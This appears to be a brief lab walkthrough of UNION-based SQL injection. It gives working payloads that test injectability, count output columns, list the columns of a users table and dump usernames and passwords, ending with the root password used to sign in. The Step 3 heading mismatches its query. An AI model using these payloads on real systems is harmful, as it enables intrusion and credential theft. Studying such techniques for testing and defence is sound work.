Dazala Injection Walk Through
=============================

Step 1: Test for Input Type
---------------------------

Begin by testing the input type to understand how the application
processes user

``` {.sql}
1 OR 1=1--
```

Step 2: Check the Number of Output Fields
-----------------------------------------

Use the following query:

``` {.sql}
1' UNION SELECT null, null, null FROM information_schema.tables;-- -
```

This query checks the number of output fields by trying different
numbers of null values.

> You could also find the number of output fields by using the following
> query:
>
> ``` {.sql}
> 1' UNION SELECT null, null, null, null FROM information_schema.tables;-- -
> ```
>
> > Using the query above, you can determine the number of output fields
> > by increasing the number of null values. So just remove or add null
> > values to find the correct number of output fields.

### Step 3: Find Table Names

Use the following query to retrieve table names:

``` {.sql}
1' UNION SELECT column_name, null, null FROM information_schema.columns WHERE table_name='users';-- -
```

This query retrieves column names from the users table.

### Step 4: Retrieve Name and Password Columns from a Known Table

Use the following query:

``` {.sql}
1' UNION SELECT username, password, null FROM users;-- -
```

This query retrieves the username and password columns from the users
table. The table displays the root's password, which can be used to sign
in.
